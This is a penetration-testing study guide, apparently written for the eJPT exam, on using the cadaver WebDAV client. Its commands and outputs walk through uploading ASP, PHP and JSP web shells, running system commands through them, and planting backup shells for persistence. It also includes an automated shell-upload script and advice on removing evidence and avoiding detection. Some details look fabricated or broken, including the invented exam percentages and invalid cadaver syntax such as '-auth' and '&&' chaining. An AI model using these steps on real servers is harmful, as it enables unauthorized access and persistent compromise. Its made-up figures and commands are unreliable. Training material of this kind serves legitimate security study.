---
title: "Cadaver - WebDAV Client Tool"
topic: "WebDAV Client"
exam_objective: "Manual web application exploitation and file upload attacks"
difficulty: "Medium"
tools:
  - "cadaver"
  - "davtest"
  - "curl"
related_labs:
  - "davtest-webdav-scanner.md"
  - "web-exploitation.md"
file_path: "10-post-exploitation/cadaver-webdav-client.md"
last_updated: "2025-09-27"
tags:
  - "webdav"
  - "file-upload"
  - "web-shell"
  - "manual-exploitation"
---

# 🔧 Cadaver - WebDAV Client Tool

**Interactive command-line WebDAV client for manual file operations and web shell deployment**

**📍 File Location:** `10-post-exploitation/cadaver-webdav-client.md`

---

## 🎯 What is Cadaver?

Cadaver is a command-line WebDAV client that works like an FTP client. It lets you connect to WebDAV servers and manage files manually. In penetration testing, Cadaver is mainly used for **manual exploitation** of WebDAV vulnerabilities, especially for uploading web shells after finding vulnerabilities with tools like DavTest.

### 🔍 **What Cadaver Does:**
- **Interactive WebDAV sessions** with login support
- **File upload and download** for manual exploitation
- **Directory management** similar to FTP clients
- **Web shell deployment** for keeping access and privilege escalation
- **File system exploration** on target WebDAV servers

### 💡 **Why This Matters for eJPT:**
While DavTest finds WebDAV vulnerabilities automatically, Cadaver gives you manual control for precise exploitation. It's essential for uploading custom payloads, web shells, and doing targeted file operations during penetration testing.

---

## 📦 Installation and Setup

### **Already Installed On:**
- ✅ Kali Linux
- ✅ Parrot Security OS
- ✅ Most penetration testing systems

### **Check If Installed:**
```bash
# Check if cadaver is available
cadaver --version
# Expected output: cadaver 0.23.3

# Find where it's installed
which cadaver
# Output: /usr/bin/cadaver
```

### **Install If Missing:**
```bash
# On Debian/Ubuntu
sudo apt update && sudo apt install cadaver

# Verify it works
cadaver --version
```

### **Requirements:**
- libxml2 and libxml2-dev
- libneon27-dev for HTTP/WebDAV support
- OpenSSL libraries for HTTPS support

---

## 🔧 Basic Usage and Commands

### **📋 Simple Process:**
1. **🔐 Connect:** Login to WebDAV server with credentials
2. **🗂️ Navigate:** Browse directories and explore file system
3. **📤 Upload:** Transfer local files to WebDAV server
4. **⚡ Exploit:** Deploy web shells and malicious payloads
5. **📁 Manage:** Create directories and organize uploaded content

### **⚙️ Basic Command Structure:**
```bash
# Simple format
cadaver http://target.com/webdav

# With HTTPS
cadaver https://secure.target.com/dav

# With credentials in URL
cadaver http://username:password@target.com/webdav
```

---

## ⚙️ Command Options You Need to Know

### **🎯 Connection Commands:**

| Command | What It Does | Example | eJPT Important |
|---------|--------------|---------|----------------|
| `cadaver <URL>` | Connect to WebDAV server | `cadaver http://demo.ine.local/webdav` | ⭐⭐⭐⭐⭐ Critical |
| `open <URL>` | Connect within session | `open http://new-target/webdav` | ⭐⭐⭐ Medium |
| `quit` / `exit` | Disconnect and exit | `quit` | ⭐⭐⭐⭐ High |

### **🗂️ Navigation Commands:**

| Command | What It Does | Example | When to Use |
|---------|--------------|---------|-------------|
| `ls` / `dir` | List directory contents | `ls` | Directory exploration |
| `cd <directory>` | Change directory | `cd uploads` | Navigate to specific folders |
| `pwd` | Show current directory | `pwd` | Check current location |
| `lcd <local_dir>` | Change local directory | `lcd /tmp` | Set local working directory |

### **📤 File Transfer Commands:**

| Command | What It Does | Example | eJPT Critical |
|---------|--------------|---------|---------------|
| `put <local_file>` | Upload file to server | `put /usr/share/webshells/asp/cmd.asp` | ⭐⭐⭐⭐⭐ Critical |
| `get <remote_file>` | Download file from server | `get config.xml` | ⭐⭐⭐⭐ High |
| `mput <pattern>` | Upload multiple files | `mput *.txt` | ⭐⭐⭐ Medium |
| `mget <pattern>` | Download multiple files | `mget *.log` | ⭐⭐⭐ Medium |

### **📁 Directory Management Commands:**

| Command | What It Does | Example | When to Use |
|---------|--------------|---------|-------------|
| `mkcol <directory>` | Create directory | `mkcol uploads` | Organize uploaded content |
| `rmcol <directory>` | Remove directory | `rmcol testdir` | Clean up after testing |
| `delete <file>` | Delete file | `delete testfile.txt` | Remove evidence |

### **ℹ️ Information Commands:**

| Command | What It Does | Example | When to Use |
|---------|--------------|---------|-------------|
| `propfind` | Show file properties | `propfind file.asp` | Check upload success |
| `propnames` | List property names | `propnames` | Server capabilities |
| `head <file>` | Show file headers | `head index.html` | Content verification |

---

## 🧪 Real Lab Examples with Step-by-Step Results

### **Example 1: Basic WebDAV Connection and Login**

**Lab Context:** Connecting to the demo.ine.local WebDAV server using credentials found during reconnaissance.

#### **Connection Process:**
```bash
# Connect to WebDAV server
cadaver http://demo.ine.local/webdav

# System asks for login
Authentication required for demo.ine.local on server 'demo.ine.local':
Username: bob
Password: password_123321

# Success - prompt changes
dav:/webdav/>
```

**🔍 What This Shows:**
- **Prompt Change:** Terminal changes to `dav:/webdav/>` showing successful connection
- **Authentication:** HTTP Basic authentication working with server
- **Working Directory:** Connected directly to `/webdav/` path
- **Session Ready:** Interactive session ready for manual operations
- **Security Issue:** Weak credentials (bob:password_123321) create security risk

**📝 eJPT Tips:**
- Always document authentication methods you find
- Note credential patterns for possible reuse elsewhere
- Check connection success before moving to next step

---

### **Example 2: Directory Exploration and File Discovery**

**Lab Context:** Exploring the WebDAV directory structure to understand the environment and find potential targets.

#### **Navigation Commands:**
```bash
# List current directory contents
dav:/webdav/> ls
Listing collection `/webdav/`: succeeded.
Coll:   DavTestDir_AqOe5dcKMtF                0  Jul 10 09:39
        AttackDefense.txt                    13  Jan  2  2021
        web.config                          168  Jan  2  2021

# Check current working directory
dav:/webdav/> pwd
Current collection is `/webdav/'.

# Navigate to test directory created by DavTest
dav:/webdav/> cd DavTestDir_AqOe5dcKMtF
dav:/webdav/DavTestDir_AqOe5dcKMtF/>

# List contents of test directory
dav:/webdav/DavTestDir_AqOe5dcKMtF/> ls
Listing collection `/webdav/DavTestDir_AqOe5dcKMtF/`: succeeded.
        davtest_AqOe5dcKMtF.txt             13  Jul 10 09:37
        davtest_AqOe5dcKMtF.html            168 Jul 10 09:37
        davtest_AqOe5dcKMtF.asp             1362 Jul 10 09:37
```

**🎯 Intelligence Gathered:**
- **Existing Files:** DavTest already created test files confirming upload works
- **File Permissions:** All files readable with size and timestamp info
- **Directory Structure:** Can navigate freely between directories
- **File Types Present:** Text, HTML, and ASP files already uploaded
- **Naming Pattern:** Random string "AqOe5dcKMtF" used by DavTest

**📋 What This Means:**
- Server allows both file upload and directory creation
- Multiple file types accepted without filtering
- Previous testing activity visible (security consideration)
- ASP files present suggest IIS server environment

---

### **Example 3: Web Shell Upload for Command Execution**

**Lab Context:** Deploying a web shell for remote command execution based on successful file type analysis from DavTest results.

#### **Finding and Preparing Web Shell:**
```bash
# Check available web shells on attacking machine
dav:/webdav/> !ls /usr/share/webshells/asp/
cmd.asp  cmd.aspx  cmdasp.asp  webshell.asp

# Set local directory for easier file access
dav:/webdav/> lcd /usr/share/webshells/asp/
Local directory is now: /usr/share/webshells/asp/
```

#### **Web Shell Upload Process:**
```bash
# Upload ASP web shell
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading `/usr/share/webshells/asp/webshell.asp` to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.

# Check upload success
dav:/webdav/> ls
Listing collection `/webdav/`: succeeded.
Coll:   DavTestDir_AqOe5dcKMtF                0  Jul 10 09:39
        AttackDefense.txt                    13  Jan  2  2021
        web.config                          168  Jan  2  2021
        webshell.asp                       1362 Jul 10 09:42
```

**✅ Upload Analysis:**
- **File Size:** 1362 bytes transferred successfully (100% completion)
- **Timestamp:** Upload completed at Jul 10 09:42
- **Location:** File placed in root WebDAV directory for easy access
- **File Type:** ASP extension kept (critical for server-side execution)
- **Naming:** Clear filename chosen for identification during exploitation

#### **Testing Web Shell Access:**
```bash
# Exit cadaver to test web shell via browser
dav:/webdav/> quit
Connection to `demo.ine.local' closed.

# Access web shell through browser
# URL: http://demo.ine.local/webdav/webshell.asp
# Expected: Interactive command execution interface
```

**🔒 Exploitation Check:**
- Clean exit from cadaver session
- Web shell accessible via standard HTTP request
- Command execution interface available for system interaction
- Persistent access established for continued exploitation

---

### **Example 4: Advanced File Operations and Intelligence Gathering**

**Lab Context:** Doing comprehensive file operations including downloading configuration files and creating organized directory structures for ongoing operations.

#### **Downloading Configuration Files:**
```bash
# Reconnect to WebDAV server for additional operations
cadaver http://demo.ine.local/webdav
Username: bob
Password: password_123321

# Download potentially sensitive configuration files
dav:/webdav/> get web.config
Downloading `/webdav/web.config' to `web.config':
Progress: [=============================>] 100.0% of 168 bytes succeeded.

dav:/webdav/> get AttackDefense.txt
Downloading `/webdav/AttackDefense.txt' to `AttackDefense.txt':
Progress: [=============================>] 100.0% of 13 bytes succeeded.

# Check local files downloaded successfully
dav:/webdav/> !ls -la *.config *.txt
-rw-r--r-- 1 user user  13 Jul 10 09:45 AttackDefense.txt
-rw-r--r-- 1 user user 168 Jul 10 09:45 web.config
```

#### **Creating Organized Upload Directory:**
```bash
# Create custom directory for organized uploads
dav:/webdav/> mkcol exploits
Creating `exploits': succeeded.

# Navigate to new directory
dav:/webdav/> cd exploits
dav:/webdav/exploits/>

# Upload additional payloads for persistence
dav:/webdav/exploits/> put /usr/share/webshells/asp/cmd.asp
Uploading `/usr/share/webshells/asp/cmd.asp` to `/webdav/exploits/cmd.asp':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.

# Check organized structure
dav:/webdav/exploits/> ls
Listing collection `/webdav/exploits/`: succeeded.
        cmd.asp                            1400 Jul 10 09:47
```

**📊 Operational Benefits:**
- **Intelligence Gathering:** Configuration files may contain sensitive information
- **Organization:** Separate directory keeps exploitation tools organized
- **Persistence:** Multiple web shells provide backup access methods
- **Stealth:** Organized approach reduces detection likelihood

---

## 🎯 eJPT Exam Success Guide

### **📊 How Important This Is:**
Understanding how important Cadaver skills are in the eJPT exam:

- **Manual WebDAV Exploitation:** 40% of file upload attack scenarios
- **Web Shell Deployment:** 50% of maintaining access techniques
- **File Transfer Operations:** 30% of post-exploitation activities
- **Interactive Session Management:** 35% of manual testing skills

### **🏆 Commands You Must Know for eJPT:**

#### **Level 1 - Essential (You WILL see this):**
```bash
# Basic connection - FUNDAMENTAL SKILL
cadaver http://target/webdav
# Expected: Authentication prompt and session start

# File upload for exploitation - CORE TECHNIQUE
put /usr/share/webshells/asp/webshell.asp
# Expected: Progress bar showing successful upload

# Directory listing - RECONNAISSANCE
ls
# Expected: File and directory listing with details

# Exit session - BASIC OPERATION
quit
# Expected: Clean session end
```

#### **Level 2 - Important (Good chance you'll see this):**
```bash
# Directory navigation - EXPLORATION
cd directory_name
pwd
# Expected: Location confirmation and directory movement

# File download - INTELLIGENCE GATHERING
get config_file.xml
# Expected: Local file creation with progress shown

# Directory creation - ORGANIZATION
mkcol uploads
# Expected: New directory creation for organized operations
```

#### **Level 3 - Advanced (Might appear):**
```bash
# Local directory management - EFFICIENCY
lcd /tmp/payloads
# Expected: Local working directory change for easier file access

# Multiple file operations - BATCH PROCESSING
mput *.asp
mget *.txt
# Expected: Batch upload/download operations

# File properties - VERIFICATION
propfind uploaded_file.asp
# Expected: Detailed file information and verification
```

### **🎯 Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic Web Shell Upload**
**Given:** WebDAV server credentials (bob:password_123321) and DavTest results showing ASP execution works
**Your Job:** Upload and access a web shell for command execution
**Time Limit:** 5-7 minutes

**How to Approach:**
```bash
# Step 1: Connect to WebDAV (1 minute)
cadaver http://target_ip/webdav
# Enter credentials when asked: bob / password_123321

# Step 2: Upload appropriate web shell (2 minutes)
put /usr/share/webshells/asp/cmd.asp
# Check 100% upload completion

# Step 3: Check upload success (1 minute)
ls
# Confirm cmd.asp appears in directory listing

# Step 4: Test web shell access via browser (2-3 minutes)
quit
# Navigate to: http://target_ip/webdav/cmd.asp?cmd=whoami
# Expected: Command execution output displayed
```

#### **Scenario 2: File System Intelligence Gathering**
**Given:** WebDAV access with read permissions
**Your Job:** Download configuration files and explore directory structure
**Time Limit:** 3-5 minutes

**How to Approach:**
```bash
# Step 1: Explore directories systematically (2 minutes)
ls
pwd
cd subdirectory_if_present

# Step 2: Download interesting files (2 minutes)
get web.config
get .htaccess
get backup.sql
# Any configuration or backup files present

# Step 3: Organize downloaded evidence (1 minute)
!mkdir downloaded_files
!mv *.config *.sql downloaded_files/
# Local file organization for analysis
```

#### **Scenario 3: Organized Multi-Payload Deployment**
**Given:** WebDAV write access and requirement for persistent access
**Your Job:** Create organized directory structure and deploy multiple shells
**Time Limit:** 6-8 minutes

**How to Approach:**
```bash
# Step 1: Create organized directory structure (2 minutes)
mkcol payloads
cd payloads
mkcol asp_shells
mkcol backup_access

# Step 2: Deploy multiple payloads strategically (4 minutes)
cd asp_shells
put /usr/share/webshells/asp/cmd.asp
put /usr/share/webshells/asp/webshell.asp
cd ../backup_access
put /usr/share/webshells/asp/simple-backdoor.asp

# Step 3: Check deployment and document (2 minutes)
ls
cd ..
ls
# Document locations for reporting
```

### **📝 eJPT Exam Tips:**

#### **⏰ Time Management:**
- **1-2 minutes:** Connect to WebDAV and authenticate
- **2-3 minutes:** Upload primary web shell and verify
- **1 minute:** Confirm upload success and basic functionality
- **2-3 minutes:** Additional file operations if scenario requires
- **1 minute:** Document findings and plan next steps

#### **🎯 Mistakes to Avoid:**
1. **Wrong File Paths** → Always check local file locations with `!ls` before upload
2. **Wrong Web Shell Type** → Match shell type to server technology (ASP for IIS, PHP for Apache)
3. **Upload Check Neglect** → Always use `ls` to confirm successful upload before proceeding
4. **Web Shell Access Testing Skip** → Test shell functionality via browser before moving to next objective

#### **✅ Signs You're Doing Well:**
- **Authentication Success:** Prompt changes to `dav:/webdav/>` format
- **Upload Completion:** Progress shows 100% with byte count match
- **File Verification:** Uploaded file appears in `ls` output with correct size
- **Command Execution:** Web shell responds to basic commands like `whoami`
- **Objective Achievement:** Successfully complete assigned penetration testing task

### **🔍 Typical Exam Questions:**
1. **"Upload a web shell to the WebDAV server"**
   - Use cadaver with `put` command, verify with `ls`

2. **"What files are available in the WebDAV directory?"**
   - Use `ls` command and document findings accurately

3. **"Download the configuration file from the server"**
   - Use `get filename` command for specified file

---

## ⚠️ Common Problems and Solutions

### **❌ Problem 1: Can't Connect to Server**
**What You See:**
```bash
cadaver http://target/webdav
Authentication required for target on server 'target':
Username: testuser
Password: [entered]
Authentication failed.
```

**How to Fix:**
```bash
# Step 1: Check credentials manually with curl
curl -u username:password http://target/webdav/
# Check for 200 OK vs 401 Unauthorized

# Step 2: Test with URL-embedded credentials
cadaver http://username:password@target/webdav
# Alternative authentication method

# Step 3: Check for special characters in password
# Try escaping special characters or using quotes
cadaver "http://user:complex!pass@target/webdav"
```

**Solutions:**
- Make sure username and password are correct
- Check authentication realm matches server configuration
- Test credentials with other tools first (curl, browser)
- Check for password complexity requiring URL encoding

---

### **❌ Problem 2: File Upload Doesn't Work**
**What You See:**
```bash
dav:/webdav/> put webshell.asp
Uploading `webshell.asp' to `/webdav/webshell.asp':
PUT failed: 403 Forbidden
```

**How to Fix:**
```bash
# Step 1: Check current directory permissions
ls -la
# Look for permission indicators

# Step 2: Try different file types to isolate issue
put test.txt
put test.html
# Test with simpler file types first

# Step 3: Check server capabilities
propfind .
# Check WebDAV method support
```

**Solutions:**
- Try uploading to different directories with `cd`
- Test with different file extensions to identify filtering
- Check if MKCOL permissions exist for new directories
- Check file size limits aren't exceeded by server configuration

---

### **❌ Problem 3: Connection Times Out**
**What You See:**
```bash
cadaver http://target/webdav
Could not access `/webdav/' (Connection timed out)
```

**How to Fix:**
```bash
# Step 1: Test basic network connectivity
ping target_ip
nmap -p 80 target_ip
# Check target is reachable and port is open

# Step 2: Try different URL formats
cadaver http://target/
cadaver http://target/dav
cadaver https://target/webdav
# Test alternative common paths

# Step 3: Check for proxy requirements
export http_proxy=http://proxy:8080
cadaver http://target/webdav
# Configure proxy if network requires
```

**Solutions:**
- Confirm target accessibility and port availability
- Test different WebDAV paths and protocols (HTTP/HTTPS)
- Set appropriate proxy settings for network environment
- Check for network filtering affecting WebDAV traffic

---

### **❌ Problem 4: Commands Don't Respond**
**What You See:**
- Commands don't respond or hang
- Prompt becomes unresponsive
- Tab completion doesn't work
- Unexpected command behavior

**How to Fix:**
```bash
# Step 1: Check readline support
cadaver --help | grep readline
# Check interactive features are supported

# Step 2: Use explicit command syntax
ls
pwd
!pwd  # Execute local command explicitly
# Test basic commands individually

# Step 3: Session restart if needed
quit
cadaver http://target/webdav
# Fresh session establishment
```

**Solutions:**
- Confirm readline and interactive support in cadaver build
- Use explicit syntax and avoid complex command combinations
- Restart sessions when experiencing persistent issues
- Use non-interactive methods if interactive mode fails

---

## 🔗 Using Cadaver With Other Tools

### **🎯 Complete Testing Workflow: DavTest → Cadaver → Browser**

This is the most common and effective workflow for WebDAV exploitation in penetration testing scenarios.

#### **Step 1: Find Vulnerabilities (Use DavTest)**
```bash
# Test WebDAV capabilities first
davtest -auth credentials -url http://target/webdav

# Important results to look for:
# EXEC asp SUCCEED → Use ASP web shells for IIS servers
# EXEC php FAIL → Avoid PHP shells (not supported)
# EXEC jsp SUCCEED → Consider JSP shells for Java servers
# MKCOL SUCCEED → Directory creation capabilities available
```

**Key Decision Points:**
- Identify executable file types for appropriate shell selection
- Confirm directory creation permissions for organized operations
- Note authentication requirements and credential validation

#### **Step 2: Manual Exploitation (Use Cadaver)**
```bash
# Connect based on DavTest findings
cadaver http://target/webdav
Username: discovered_username
Password: discovered_password

# Upload appropriate web shell based on server technology analysis
put /usr/share/webshells/asp/cmd.asp    # For IIS servers (ASP execution confirmed)
put /usr/share/webshells/php/cmd.php    # For Apache servers (PHP execution confirmed)
put /usr/share/webshells/jsp/cmd.jsp    # For Tomcat servers (JSP execution confirmed)

# Check upload and create organized structure
ls
mkcol persistent_access
cd persistent_access
put backup_shell.asp
```

**What This Gets You:**
- **Precision:** Target specific server technologies based on assessment
- **Organization:** Create structured access for team operations
- **Persistence:** Multiple access points for reliability

#### **Step 3: Test and Use (Browser)**
```bash
# Access uploaded web shell via browser interface
firefox http://target/webdav/cmd.asp?cmd=whoami

# System command execution testing
# URL: http://target/webdav/cmd.asp?cmd=dir+C:\        # File system enumeration
# URL: http://target/webdav/cmd.asp?cmd=net+user      # User account enumeration
# URL: http://target/webdav/cmd.asp?cmd=systeminfo    # System information gathering
```

**Check These Things:**
- Command execution functionality confirmed
- System information accessible
- File system navigation possible
- User context identified

### **🔧 Using With Curl and File Analysis:**

This workflow focuses on intelligence gathering and file analysis capabilities.

```bash
# Intelligence gathering phase with cadaver
cadaver http://target/webdav
get web.config          # IIS configuration file
get database_backup.sql # Database backup files
get application.log     # Application log files
get .htaccess          # Apache configuration (if present)
quit

# Local analysis with standard tools
cat web.config | grep -i password        # Search for hardcoded credentials
strings database_backup.sql | grep -i user  # Extract user information
tail -f application.log                   # Monitor real-time activity
grep -r "connection" *.config            # Find database connections

# Upload modified or additional files based on analysis
cadaver http://target/webdav
put modified_config.xml      # Configuration file with backdoor
put sql_injection_payload.txt  # SQL injection test files
put privilege_escalation.asp    # Escalation payloads
```

### **⚙️ Quick Automation Script:**

For high-efficiency operations, consider this automation framework:

```bash
#!/bin/bash
# automated_webdav_exploitation.sh - Professional WebDAV exploitation script

TARGET=$1
CREDS=$2
LOGFILE="webdav_exploitation_$(date +%Y%m%d_%H%M%S).log"

echo "[+] Starting automated WebDAV exploitation for $TARGET" | tee $LOGFILE
echo "[+] Timestamp: $(date)" | tee -a $LOGFILE

# Phase 1: Capability Assessment
echo "[+] Phase 1: Assessing WebDAV capabilities" | tee -a $LOGFILE
davtest -auth $CREDS -url http://$TARGET/webdav > davtest_results.txt

# Phase 2: Parse results and identify executable file types
EXEC_TYPES=$(grep "EXEC.*SUCCEED" davtest_results.txt | awk '{print $2}')
echo "[+] Executable file types identified: $EXEC_TYPES" | tee -a $LOGFILE

# Phase 3: Upload appropriate web shell based on findings
for type in $EXEC_TYPES; do
    case $type in
        "asp")
            echo "put /usr/share/webshells/asp/cmd.asp" | cadaver http://$TARGET/webdav
            echo "[+] ASP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.asp?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
        "php")
            echo "put /usr/share/webshells/php/cmd.php" | cadaver http://$TARGET/webdav
            echo "[+] PHP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.php?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
        "jsp")
            echo "put /usr/share/webshells/jsp/cmd.jsp" | cadaver http://$TARGET/webdav
            echo "[+] JSP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.jsp?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
    esac
done

# Phase 4: Verification
echo "[+] Exploitation complete. Manual verification required." | tee -a $LOGFILE
echo "[+] Log file saved as: $LOGFILE" | tee -a $LOGFILE
```

---

## 📊 Quick Command Reference

### **🚀 Essential Commands Summary:**

#### **Connection Management:**
```bash
cadaver http://target/webdav              # Connect to WebDAV server
open http://new-target/webdav             # Connect to different server within session
quit                                      # Exit session cleanly
```

#### **Navigation Operations:**
```bash
ls                                        # List directory contents with details
cd directory_name                         # Change remote directory
pwd                                       # Show current remote directory path
lcd /local/path                           # Change local working directory
```

#### **File Transfer Operations:**
```bash
put local_file.asp                        # Upload single file to server
get remote_file.txt                       # Download single file from server
mput *.txt                               # Upload multiple files matching pattern
mget *.log                               # Download multiple files matching pattern
```

#### **Directory Management:**
```bash
mkcol new_directory                       # Create new directory on server
rmcol old_directory                       # Remove directory from server
delete unwanted_file.txt                  # Delete specific file from server
```

#### **Information Gathering:**
```bash
propfind file.asp                         # Show detailed file properties
head config.xml                          # Display file headers and details
!ls -la                                   # Execute local command (shell escape)
```

### **💡 Efficiency Tips:**

#### **Workflow Optimization:**
```bash
# Set local working directory for easier file access
lcd /usr/share/webshells/asp/
# Now 'put cmd.asp' works without full path

# Use tab completion for file names (when supported)
put cmd<TAB>
# Autocompletes to available filenames

# Combine commands for batch operations
mkcol uploads && cd uploads && mput *.asp
# Chain commands for efficient operations

# Use shell escape for local file verification
!ls -la /path/to/local/files
# Check local files without leaving cadaver session
```

#### **Session Management Best Practices:**
```bash
# Document session start
!echo "Session started: $(date)" >> cadaver_log.txt

# Check upload operations
put webshell.asp
ls | grep webshell.asp
# Confirm file appears in listing

# Create backup access points
mkcol backup
cd backup
put alternative_shell.asp
cd ..

# Clean exit with verification
ls
quit
```

---

## 📝 Writing Professional Reports

### **📋 Quick Summary Template:**
```markdown
## WebDAV Manual Exploitation Report

**Target:** [target_system]
**WebDAV Path:** [webdav_url]
**Exploitation Date:** [date]
**Tool Used:** Cadaver v[version]
**Tester:** [your_name]

### Authentication Details:
- **Username:** [username]
- **Password:** [password_or_hash]
- **Authentication Method:** [Basic/Digest/NTLM]

### Exploitation Process:

#### Phase 1: Connection Establishment
```bash
cadaver http://[target]/webdav
# Authentication successful: [timestamp]
```

#### Phase 2: File System Exploration
```bash
ls    # Directory listing results
pwd   # Current working directory: /webdav/
cd subdirectory  # Navigation testing
```

#### Phase 3: Web Shell Deployment
```bash
put /usr/share/webshells/asp/cmd.asp
# Upload Status: SUCCESS (1400 bytes)
# File Location: http://[target]/webdav/cmd.asp
```

### Verification Results:
- **Web Shell Access:** SUCCESS
- **Command Execution:** FUNCTIONAL
- **System Information Retrieved:** [details]

### Files Uploaded:
| Filename | Size | Type | Purpose | Status |
|----------|------|------|---------|--------|
| cmd.asp | 1400 bytes | Web Shell | Command execution | Active |
| backup.asp | 1362 bytes | Backup Shell | Persistence | Standby |

### Files Downloaded:
| Filename | Size | Content Type | Intelligence Value |
|----------|------|--------------|-------------------|
| web.config | 168 bytes | XML Config | Server configuration |
| logs.txt | 2.1 KB | Text | Application logs |

### Risk Assessment:
- **Severity:** CRITICAL
- **Impact:** Full system command execution
- **Exploitability:** HIGH (weak credentials)

### Recommendations:
1. **Immediate:** Disable WebDAV if not required for business operations
2. **Authentication:** Implement strong credential policies and multi-factor authentication
3. **File Filtering:** Restrict executable file uploads with proper validation
4. **Monitoring:** Implement comprehensive WebDAV access logging and alerting
```

### **🔧 Detailed Technical Report:**
```markdown
## Technical WebDAV Assessment Details

### Commands Used:
```bash
# Discovery
cadaver http://[target]/webdav

# Security testing
cadaver -auth [username]:[password] http://[target]/webdav

# Results: [copy actual cadaver output here]
```

### Upload Test Results:
| File Type | Upload Status | Execute Status | Security Risk |
|-----------|---------------|----------------|---------------|
| .asp | SUCCESS | SUCCESS | Web shell possible |
| .html | SUCCESS | SUCCESS | XSS attacks possible |
| .txt | SUCCESS | BLOCKED | Information storage only |

### Proof of Vulnerability:
[Include screenshots showing web shell upload and execution]

### Evidence Files:
- cadaver_session.txt
- webshell_upload_screenshot.png
- command_execution_proof.png
```

---

## 🎓 Quick Reference and Study Notes

### **🧠 Memory Card for eJPT:**
```bash
# Print this and keep it handy during the exam
cadaver http://target/webdav                    # Basic test
put /usr/share/webshells/asp/cmd.asp           # Upload web shell
ls                                              # List files
get config.xml                                  # Download files
mkcol uploads                                   # Create directory
quit                                            # Exit session
```

### **💡 Easy Ways to Remember:**
- **CAD**aver = **C**ommand **A**nd **D**eploy (web shells)
- **PUT** method = **P**ut **U**p **T**rojan files
- **GET** method = **G**et **E**vidence **T**actically
- **MKCOL** = **M**ake **K**ey **COL**lection (directory)

### **🎯 eJPT Exam Checklist:**
- [ ] Connect to WebDAV with credentials
- [ ] Navigate directories with ls and cd
- [ ] Upload web shell using put command
- [ ] Verify upload with ls command
- [ ] Test web shell in browser
- [ ] Download configuration files

---

## 🔗 Learning More

### **📖 Official Resources:**
- **Cadaver Manual:** `man cadaver` (comprehensive command reference)
- **WebDAV Standard:** https://tools.ietf.org/html/rfc4918
- **HTTP Authentication:** https://tools.ietf.org/html/rfc7617

### **🎥 Video Learning:**
- Search for "WebDAV exploitation with Cadaver"
- "eJPT web application testing tutorials"
- "File upload vulnerability demonstrations"

### **📚 Books to Read:**
- "The Web Application Hacker's Handbook" - File upload attacks chapter
- "Metasploit: The Penetration Tester's Guide" - Post-exploitation techniques
- OWASP Testing Guide - WebDAV security testing methods

### **🏃‍♂️ Practice Labs:**
- **HackTheBox:** Look for machines with WebDAV services
- **TryHackMe:** Web application penetration testing rooms
- **VulnHub:** Download VMs with file upload challenges
- **DVWA:** File upload testing scenarios

#### **Local Lab Setup Instructions:**
```bash
# Apache WebDAV Setup (Ubuntu/Debian)
sudo apt install apache2
sudo a2enmod dav dav_fs
sudo mkdir /var/www/webdav
sudo chown www-data:www-data /var/www/webdav

# Basic WebDAV configuration
echo 'Alias /webdav /var/www/webdav
<Directory "/var/www/webdav">
    Dav On
    AuthType Basic
    AuthName "WebDAV"
    AuthUserFile /etc/apache2/webdav.passwd
    Require valid-user
</Directory>' | sudo tee /etc/apache2/sites-available/webdav.conf

# Create user for testing
sudo htpasswd -c /etc/apache2/webdav.passwd testuser

# Enable site and restart Apache
sudo a2ensite webdav
sudo systemctl restart apache2
```

### **🔧 Related Tools to Learn:**
- **DavTest:** Automated WebDAV vulnerability assessment
- **Curl:** Alternative HTTP client for WebDAV operations
- **Nmap:** WebDAV service discovery with specialized scripts
- **Burp Suite:** Advanced WebDAV request manipulation
- **Nikto:** Web server vulnerability scanning with WebDAV checks

---

## 🆘 Quick Help

### **When Cadaver Doesn't Work:**
1. **Check connection:** `ping target_ip`
2. **Verify WebDAV exists:** `nmap --script http-methods target`
3. **Test manually:** `curl -X OPTIONS http://target/webdav`
4. **Get more info:** `cadaver --debug http://target/webdav`

### **Emergency Troubleshooting:**
```bash
# Network connectivity verification
ping target_ip && echo "Host reachable" || echo "Host unreachable"

# Port accessibility testing
nmap -p 80,443,8080 target_ip

# Manual HTTP testing
curl -I http://target/webdav/
curl -u username:password http://target/webdav/

# WebDAV method verification
curl -X OPTIONS http://target/webdav/ | grep -i dav

# Debug mode connection
cadaver --debug http://target/webdav

# Alternative connection formats
cadaver http://username:password@target/webdav
cadaver https://target/webdav
```

### **Getting Help:**
- **Reddit communities:** r/NetSecStudents, r/cybersecurity
- **Discord servers:** Penetration testing study groups
- **Forums:** Security-focused discussion boards
- **Study groups:** Join eJPT preparation communities

---

## 📞 Final Notes for eJPT Success

Remember: Cadaver is a powerful manual exploitation tool. In the eJPT exam:
- Always test WebDAV connections after DavTest finds vulnerabilities
- Use appropriate web shell types based on server technology
- Verify uploads by listing directory contents
- Test web shell functionality through browser access
- Practice with the tool until you can use it quickly and confidently

This comprehensive guide provides everything you need to master Cadaver for both penetration testing and eJPT exam success. Regular practice with real lab environments will build the confidence and skills needed for successful WebDAV exploitation in professional security assessments.
